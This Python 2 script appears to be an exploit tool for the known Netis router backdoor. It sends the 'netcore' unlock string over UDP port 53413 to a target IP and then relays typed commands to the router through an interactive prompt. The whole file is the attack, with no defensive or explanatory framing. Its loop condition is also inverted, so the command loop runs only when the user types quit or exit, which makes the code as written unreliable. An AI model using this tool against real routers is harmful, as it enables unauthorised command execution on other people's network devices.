import socket
import argparse
import binascii

parser = argparse.ArgumentParser(description='Netis backdoor')
parser.add_argument('IP', help='IP of router to connect to')

args = parser.parse_args()

def send(command, print_response = True):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   #s.connect((args.IP, 53413))
   s.sendto("AA\x00\x00AAAA%s\x00" %(command), (args.IP, 53413))
   if print_response:
      resp = s.recv(1024)
      resp = resp[8:]
      if binascii.hexlify(resp) == "000000ff":
         print("No response, command not found or error in command")
      else:
         print(resp)

def login():
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   #s.connect((args.IP, 53413))
   s.sendto("AAAAAAAAnetcore\x00", (args.IP, 53413))

print("Unlocking Backdoor")
login()
input = ""
print("Quit to quit loop")
input = raw_input("Netis> ").strip()
while input.strip().upper() in ["QUIT","EXIT"]:
   send(" " + input)
   input = raw_input("Netis> ").strip()

